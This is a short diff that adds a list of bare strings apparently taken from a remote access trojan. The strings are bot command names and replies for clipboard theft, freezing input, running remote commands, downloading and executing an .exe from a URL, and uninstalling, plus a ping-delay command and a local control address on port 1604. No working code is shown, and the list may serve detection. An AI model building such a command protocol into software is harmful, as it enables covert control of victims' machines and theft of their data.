@@ -1,0 +1,29 @@
+#GetClipboardText
+#SendClip
+#SendTaskMgr
+#FreezeIO
+#UnFreezeIO
+#BOT#VisitUrl
+#BOT#OpenUrl
+HTTP://
+www.
+http://
+BTRESULTOpen URL|
+ is now open!|
+#BOT#Ping
+BTRESULTPing|Respond [OK] for the ping !|
+#BOT#RunPrompt
+BTRESULTRun command|
+ Command successfully executed!|
+#BOT#CloseServer
+BTRESULTClose Server|close command receive, bye bye...|
+#BOT#SvrUninstall
+BTRESULTUninstall|uninstall command receive, bye bye...|
+#BOT#URLUpdate
+.exe
+BTERRORUpdate from URL| Error on downloading file check if you type the correct url...|
+BTRESULTUpdate from URL|Update : File Downloaded , Executing new one in temp dir...|
+#BOT#URLDownload
+
+ping 127.0.0.1 -n 4 > NUL && "
+127.0.0.1:1604
